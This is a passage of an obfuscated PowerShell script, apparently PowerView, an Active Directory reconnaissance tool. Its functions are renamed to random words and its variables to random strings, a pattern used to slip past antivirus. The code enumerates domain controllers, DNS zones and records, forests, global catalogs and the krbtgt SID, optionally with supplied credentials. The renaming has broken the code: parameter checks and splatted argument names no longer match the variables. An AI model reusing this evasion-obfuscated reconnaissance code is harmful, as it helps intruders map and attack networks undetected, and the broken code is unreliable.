        $PvRupVWt99
    )
    $eniwQEmC99 = @{}
    $PvRupVWt99.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $eniwQEmC99[$_] = $PvRupVWt99[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $eniwQEmC99[$_] = $PvRupVWt99[$_][0] -as $eFqgcJVd99
            }
            elseif ($_ -eq 'samaccounttype') {
                $eniwQEmC99[$_] = $PvRupVWt99[$_][0] -as $NuEUignM99
            }
            elseif ($_ -eq 'objectguid') {
                $eniwQEmC99[$_] = (New-Object Guid (,$PvRupVWt99[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $eniwQEmC99[$_] = $PvRupVWt99[$_][0] -as $tGlaulwz99
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $ytHERJky99 = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $PvRupVWt99[$_][0], 0
                if ($ytHERJky99.Owner) {
                    $eniwQEmC99['Owner'] = $ytHERJky99.Owner
                }
                if ($ytHERJky99.Group) {
                    $eniwQEmC99['Group'] = $ytHERJky99.Group
                }
                if ($ytHERJky99.DiscretionaryAcl) {
                    $eniwQEmC99['DiscretionaryAcl'] = $ytHERJky99.DiscretionaryAcl
                }
                if ($ytHERJky99.SystemAcl) {
                    $eniwQEmC99['SystemAcl'] = $ytHERJky99.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($PvRupVWt99[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $eniwQEmC99[$_] = "NEVER"
                }
                else {
                    $eniwQEmC99[$_] = [datetime]::fromfiletime($PvRupVWt99[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($PvRupVWt99[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $PvRupVWt99[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $eniwQEmC99[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $eniwQEmC99[$_] = ([datetime]::FromFileTime(($PvRupVWt99[$_][0])))
                }
            }
            elseif ($PvRupVWt99[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $PvRupVWt99[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $eniwQEmC99[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[decaffeinating] error: $_"
                    $eniwQEmC99[$_] = $Prop[$_]
                }
            }
            elseif ($PvRupVWt99[$_].count -eq 1) {
                $eniwQEmC99[$_] = $PvRupVWt99[$_][0]
            }
            else {
                $eniwQEmC99[$_] = $PvRupVWt99[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $eniwQEmC99
    }
    catch {
        Write-Warning "[decaffeinating] Error parsing LDAP properties : $_"
    }
}
function breading {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [String]
        $OYLiXxeG99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99 = 120,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $ZvvIEIXc99,
        [Switch]
        $CnaAXLuN99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $zXzbbNbr99 = $jeGdZvYa99
            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $BUwbCXsa99 = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $BUwbCXsa99) {
                    $rZDIzskQ99 = "$($ENV:LOGONSERVER -replace '\\','').$BUwbCXsa99"
                }
            }
        }
        elseif ($PSBoundParameters['Credential']) {
            $viErJwln99 = Herodotus -DOZPHpup99 $DOZPHpup99
            $rZDIzskQ99 = ($viErJwln99.PdcRoleOwner).Name
            $zXzbbNbr99 = $viErJwln99.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $zXzbbNbr99 = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $zXzbbNbr99) {
                $rZDIzskQ99 = "$($ENV:LOGONSERVER -replace '\\','').$zXzbbNbr99"
            }
        }
        else {
            write-verbose "get-domain"
            $viErJwln99 = Herodotus
            $rZDIzskQ99 = ($viErJwln99.PdcRoleOwner).Name
            $zXzbbNbr99 = $viErJwln99.Name
        }
        if ($PSBoundParameters['Server']) {
            $rZDIzskQ99 = $YdBDxrjg99
        }
        $gdImMELe99 = 'LDAP://'
        if ($rZDIzskQ99 -and ($rZDIzskQ99.Trim() -ne '')) {
            $gdImMELe99 += $rZDIzskQ99
            if ($zXzbbNbr99) {
                $gdImMELe99 += '/'
            }
        }
        if ($PSBoundParameters['SearchBasePrefix']) {
            $gdImMELe99 += $OYLiXxeG99 + ','
        }
        if ($PSBoundParameters['SearchBase']) {
            if ($MBPsLBEN99 -Match '^GC://') {
                $DN = $MBPsLBEN99.ToUpper().Trim('/')
                $gdImMELe99 = ''
            }
            else {
                if ($MBPsLBEN99 -match '^LDAP://') {
                    if ($MBPsLBEN99 -match "LDAP://.+/.+") {
                        $gdImMELe99 = ''
                        $DN = $MBPsLBEN99
                    }
                    else {
                        $DN = $MBPsLBEN99.SubString(7)
                    }
                }
                else {
                    $DN = $MBPsLBEN99
                }
            }
        }
        else {
            if ($zXzbbNbr99 -and ($zXzbbNbr99.Trim() -ne '')) {
                $DN = "DC=$($zXzbbNbr99.Replace('.', ',DC='))"
            }
        }
        $gdImMELe99 += $DN
        Write-Verbose "[breading] search base: $gdImMELe99"
        if ($DOZPHpup99 -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[breading] Using alternate credentials for LDAP connection"
            $viErJwln99 = New-Object DirectoryServices.DirectoryEntry($gdImMELe99, $DOZPHpup99.UserName, $DOZPHpup99.GetNetworkCredential().Password)
            $sPshdNSJ99 = New-Object System.DirectoryServices.DirectorySearcher($viErJwln99)
        }
        else {
            $sPshdNSJ99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$gdImMELe99)
        }
        $sPshdNSJ99.PageSize = $xRYvUWYi99
        $sPshdNSJ99.SearchScope = $eLpWCwqM99
        $sPshdNSJ99.CacheResults = $False
        $sPshdNSJ99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
        if ($PSBoundParameters['ServerTimeLimit']) {
            $sPshdNSJ99.ServerTimeLimit = $vqNdfRPs99
        }
        if ($PSBoundParameters['Tombstone']) {
            $sPshdNSJ99.Tombstone = $True
        }
        if ($PSBoundParameters['LDAPFilter']) {
            $sPshdNSJ99.filter = $gzpPmKdI99
        }
        if ($PSBoundParameters['SecurityMasks']) {
            $sPshdNSJ99.SecurityMasks = Switch ($ZvvIEIXc99) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }
        if ($PSBoundParameters['Properties']) {
            $DgYojwug99 = $PvRupVWt99| ForEach-Object { $_.Split(',') }
            $Null = $sPshdNSJ99.PropertiesToLoad.AddRange(($DgYojwug99))
        }
        $sPshdNSJ99
    }
}
function copious {
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $cLGqJlzL99
    )
    BEGIN {
        function provincials {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )
            [Int]$tLujxCJg99 = $Raw[0]
            [Int]$XvmBBuSP99 = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''
            while ($XvmBBuSP99-- -gt 0)
            {
                [Int]$gflxNemx99 = $Raw[$Index++]
                while ($gflxNemx99-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }
    PROCESS {
        $OzXNevGf99 = [BitConverter]::ToUInt16($cLGqJlzL99, 2)
        $HxDtvTPf99 = [BitConverter]::ToUInt32($cLGqJlzL99, 8)
        $bAyRMGtg99 = $cLGqJlzL99[12..15]
        $Null = [array]::Reverse($bAyRMGtg99)
        $TTL = [BitConverter]::ToUInt32($bAyRMGtg99, 0)
        $Age = [BitConverter]::ToUInt32($cLGqJlzL99, 20)
        if ($Age -ne 0) {
            $TdJROiiY99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TdJROiiY99 = '[static]'
        }
        $prRQUUVE99 = New-Object PSObject
        if ($OzXNevGf99 -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $cLGqJlzL99[24], $cLGqJlzL99[25], $cLGqJlzL99[26], $cLGqJlzL99[27]
            $Data = $IP
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'A'
        }
        elseif ($OzXNevGf99 -eq 2) {
            $IKGIzawu99 = provincials $cLGqJlzL99[24..$cLGqJlzL99.length]
            $Data = $IKGIzawu99
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'NS'
        }
        elseif ($OzXNevGf99 -eq 5) {
            $Alias = provincials $cLGqJlzL99[24..$cLGqJlzL99.length]
            $Data = $Alias
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'CNAME'
        }
        elseif ($OzXNevGf99 -eq 6) {
            $Data = $([System.Convert]::ToBase64String($cLGqJlzL99[24..$cLGqJlzL99.length]))
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'SOA'
        }
        elseif ($OzXNevGf99 -eq 12) {
            $Ptr = provincials $cLGqJlzL99[24..$cLGqJlzL99.length]
            $Data = $Ptr
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'PTR'
        }
        elseif ($OzXNevGf99 -eq 13) {
            $Data = $([System.Convert]::ToBase64String($cLGqJlzL99[24..$cLGqJlzL99.length]))
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'HINFO'
        }
        elseif ($OzXNevGf99 -eq 15) {
            $Data = $([System.Convert]::ToBase64String($cLGqJlzL99[24..$cLGqJlzL99.length]))
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'MX'
        }
        elseif ($OzXNevGf99 -eq 16) {
            [string]$TXT  = ''
            [int]$gflxNemx99 = $cLGqJlzL99[24]
            $Index = 25
            while ($gflxNemx99-- -gt 0) {
                $TXT += [char]$cLGqJlzL99[$index++]
            }
            $Data = $TXT
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'TXT'
        }
        elseif ($OzXNevGf99 -eq 28) {
            $Data = $([System.Convert]::ToBase64String($cLGqJlzL99[24..$cLGqJlzL99.length]))
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'AAAA'
        }
        elseif ($OzXNevGf99 -eq 33) {
            $Data = $([System.Convert]::ToBase64String($cLGqJlzL99[24..$cLGqJlzL99.length]))
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'SRV'
        }
        else {
            $Data = $([System.Convert]::ToBase64String($cLGqJlzL99[24..$cLGqJlzL99.length]))
            $prRQUUVE99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
        }
        $prRQUUVE99 | Add-Member Noteproperty 'UpdatedAtSerial' $HxDtvTPf99
        $prRQUUVE99 | Add-Member Noteproperty 'TTL' $TTL
        $prRQUUVE99 | Add-Member Noteproperty 'Age' $Age
        $prRQUUVE99 | Add-Member Noteproperty 'TimeStamp' $TdJROiiY99
        $prRQUUVE99 | Add-Member Noteproperty 'Data' $Data
        $prRQUUVE99
    }
}
function contrariness {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSZone')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99,
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $zLdPCUTB99 = @{
            'LDAPFilter' = '(objectClass=dnsZone)'
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $npQwgWzW99 = breading @SearcherArguments
        if ($npQwgWzW99) {
            if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $npQwgWzW99.FindOne()  }
            else { $NtqBcYnO99 = $npQwgWzW99.FindAll() }
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                $Out = decaffeinating -PvRupVWt99 $_.Properties
                $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                $Out
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[suctioned] Error disposing of the Results object: $_"
                }
            }
            $npQwgWzW99.dispose()
        }
        $zLdPCUTB99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
        $iuFszUEL99 = breading @SearcherArguments
        if ($iuFszUEL99) {
            try {
                if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $iuFszUEL99.FindOne() }
                else { $NtqBcYnO99 = $iuFszUEL99.FindAll() }
                $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                    $Out = decaffeinating -PvRupVWt99 $_.Properties
                    $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                    $Out
                }
                if ($NtqBcYnO99) {
                    try { $NtqBcYnO99.dispose() }
                    catch {
                        Write-Verbose "[contrariness] Error disposing of the Results object: $_"
                    }
                }
            }
            catch {
                Write-Verbose "[contrariness] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
            }
            $iuFszUEL99.dispose()
        }
    }
}
function piebald {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DNSRecord')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $VsOSgRRM99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $PvRupVWt99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Alias('ReturnOne')]
        [Switch]
        $fnsssdap99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $zLdPCUTB99 = @{
            'LDAPFilter' = '(objectClass=dnsNode)'
            'SearchBasePrefix' = "DC=$($VsOSgRRM99),CN=MicrosoftDNS,DC=DomainDnsZones"
        }
        if ($PSBoundParameters['Domain']) { $zLdPCUTB99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Server']) { $zLdPCUTB99['Server'] = $YdBDxrjg99 }
        if ($PSBoundParameters['Properties']) { $zLdPCUTB99['Properties'] = $PvRupVWt99 }
        if ($PSBoundParameters['ResultPageSize']) { $zLdPCUTB99['ResultPageSize'] = $xRYvUWYi99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $zLdPCUTB99['ServerTimeLimit'] = $vqNdfRPs99 }
        if ($PSBoundParameters['Credential']) { $zLdPCUTB99['Credential'] = $DOZPHpup99 }
        $zjooqdzL99 = breading @SearcherArguments
        if ($zjooqdzL99) {
            if ($PSBoundParameters['FindOne']) { $NtqBcYnO99 = $zjooqdzL99.FindOne() }
            else { $NtqBcYnO99 = $zjooqdzL99.FindAll() }
            $NtqBcYnO99 | Where-Object {$_} | ForEach-Object {
                try {
                    $Out = decaffeinating -PvRupVWt99 $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
                    $Out | Add-Member NoteProperty 'ZoneName' $VsOSgRRM99
                    if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                        $rLvvxtnY99 = copious -cLGqJlzL99 $Out.dnsrecord[0]
                    }
                    else {
                        $rLvvxtnY99 = copious -cLGqJlzL99 $Out.dnsrecord
                    }
                    if ($rLvvxtnY99) {
                        $rLvvxtnY99.PSObject.Properties | ForEach-Object {
                            $Out | Add-Member NoteProperty $_.Name $_.Value
                        }
                    }
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSRecord')
                    $Out
                }
                catch {
                    Write-Warning "[piebald] Error: $_"
                    $Out
                }
            }
            if ($NtqBcYnO99) {
                try { $NtqBcYnO99.dispose() }
                catch {
                    Write-Verbose "[piebald] Error disposing of the Results object: $_"
                }
            }
            $zjooqdzL99.dispose()
        }
    }
}
function Herodotus {
    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose '[Herodotus] Using alternate credentials for Herodotus'
            if ($PSBoundParameters['Domain']) {
                $zXzbbNbr99 = $jeGdZvYa99
            }
            else {
                $zXzbbNbr99 = $DOZPHpup99.GetNetworkCredential().Domain
                Write-Verbose "[Herodotus] Extracted domain '$zXzbbNbr99' from -DOZPHpup99"
            }
            $zRNCMjcn99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $zXzbbNbr99, $DOZPHpup99.UserName, $DOZPHpup99.GetNetworkCredential().Password)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($zRNCMjcn99)
            }
            catch {
                Write-Verbose "[Herodotus] The specified domain '$zXzbbNbr99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $zRNCMjcn99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $jeGdZvYa99)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($zRNCMjcn99)
            }
            catch {
                Write-Verbose "[Herodotus] The specified domain '$jeGdZvYa99' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[Herodotus] Error retrieving the current domain: $_"
            }
        }
    }
}
function shriller {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Computer')]
    [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [Switch]
        $LDAP,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $mkQcVZHq99 = @{}
        if ($PSBoundParameters['Domain']) { $mkQcVZHq99['Domain'] = $jeGdZvYa99 }
        if ($PSBoundParameters['Credential']) { $mkQcVZHq99['Credential'] = $DOZPHpup99 }
        if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
            if ($PSBoundParameters['Server']) { $mkQcVZHq99['Server'] = $YdBDxrjg99 }
            $mkQcVZHq99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
            boozed @Arguments
        }
        else {
            $eJmvWtGL99 = Herodotus @Arguments
            if ($eJmvWtGL99) {
                $eJmvWtGL99.DomainControllers
            }
        }
    }
}
function syllabified {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $EpmHvRmP99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        if ($PSBoundParameters['Credential']) {
            Write-Verbose "[syllabified] Using alternate credentials for syllabified"
            if ($PSBoundParameters['Forest']) {
                $EXgNWbdg99 = $EpmHvRmP99
            }
            else {
                $EXgNWbdg99 = $DOZPHpup99.GetNetworkCredential().Domain
                Write-Verbose "[syllabified] Extracted domain '$EpmHvRmP99' from -DOZPHpup99"
            }
            $ipPcGMSr99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $EXgNWbdg99, $DOZPHpup99.UserName, $DOZPHpup99.GetNetworkCredential().Password)
            try {
                $BfBbKthw99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ipPcGMSr99)
            }
            catch {
                Write-Verbose "[syllabified] The specified forest '$EXgNWbdg99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
                $Null
            }
        }
        elseif ($PSBoundParameters['Forest']) {
            $ipPcGMSr99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $EpmHvRmP99)
            try {
                $BfBbKthw99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ipPcGMSr99)
            }
            catch {
                Write-Verbose "[syllabified] The specified forest '$EpmHvRmP99' does not exist, could not be contacted, or there isn't an existing trust: $_"
                return $Null
            }
        }
        else {
            $BfBbKthw99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
        }
        if ($BfBbKthw99) {
            if ($PSBoundParameters['Credential']) {
                $iwuVjlBJ99 = (togae -fqOhNdkk99 "krbtgt" -jeGdZvYa99 $BfBbKthw99.RootDomain.Name -DOZPHpup99 $DOZPHpup99).objectsid
            }
            else {
                $iwuVjlBJ99 = (togae -fqOhNdkk99 "krbtgt" -jeGdZvYa99 $BfBbKthw99.RootDomain.Name).objectsid
            }
            $Parts = $iwuVjlBJ99 -Split '-'
            $iwuVjlBJ99 = $Parts[0..$($Parts.length-2)] -join '-'
            $BfBbKthw99 | Add-Member NoteProperty 'RootDomainSid' $iwuVjlBJ99
            $BfBbKthw99
        }
    }
}
function extinguish {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.Domain')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $EpmHvRmP99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $mkQcVZHq99 = @{}
        if ($PSBoundParameters['Forest']) { $mkQcVZHq99['Forest'] = $EpmHvRmP99 }
        if ($PSBoundParameters['Credential']) { $mkQcVZHq99['Credential'] = $DOZPHpup99 }
        $BfBbKthw99 = syllabified @Arguments
        if ($BfBbKthw99) {
            $BfBbKthw99.Domains
        }
    }
}
function rebating {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.ActiveDirectory.GlobalCatalog')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $EpmHvRmP99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $mkQcVZHq99 = @{}
        if ($PSBoundParameters['Forest']) { $mkQcVZHq99['Forest'] = $EpmHvRmP99 }
        if ($PSBoundParameters['Credential']) { $mkQcVZHq99['Credential'] = $DOZPHpup99 }
        $BfBbKthw99 = syllabified @Arguments
        if ($BfBbKthw99) {
            $BfBbKthw99.FindAllGlobalCatalogs()
        }
    }
}
function entitle {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([System.DirectoryServices.ActiveDirectory.ActiveDirectorySchemaClass])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [Alias('Class')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $llbVkLec99,
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $EpmHvRmP99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DOZPHpup99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $mkQcVZHq99 = @{}
        if ($PSBoundParameters['Forest']) { $mkQcVZHq99['Forest'] = $EpmHvRmP99 }
        if ($PSBoundParameters['Credential']) { $mkQcVZHq99['Credential'] = $DOZPHpup99 }
        $BfBbKthw99 = syllabified @Arguments
        if ($BfBbKthw99) {
            if ($PSBoundParameters['ClassName']) {
                ForEach ($WXcnokDN99 in $llbVkLec99) {
                    $BfBbKthw99.Schema.FindClass($WXcnokDN99)
                }
            }
            else {
                $BfBbKthw99.Schema.FindAllClasses()
            }
        }
    }
}
function liberty {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.PropertyOutlier')]
    [CmdletBinding(DefaultParameterSetName = 'ClassName')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ParameterSetName = 'ClassName')]
        [Alias('Class')]
        [ValidateSet('User', 'Group', 'Computer')]
        [String]
        $llbVkLec99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $dtdvfmir99,
        [Parameter(ValueFromPipeline = $True, Mandatory = $True, ParameterSetName = 'ReferenceObject')]
        [PSCustomObject]
        $NEqwJTYT99,
        [ValidateNotNullOrEmpty()]
        [String]
        $jeGdZvYa99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $gzpPmKdI99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $MBPsLBEN99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $YdBDxrjg99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $eLpWCwqM99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $xRYvUWYi99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $vqNdfRPs99,
        [Switch]
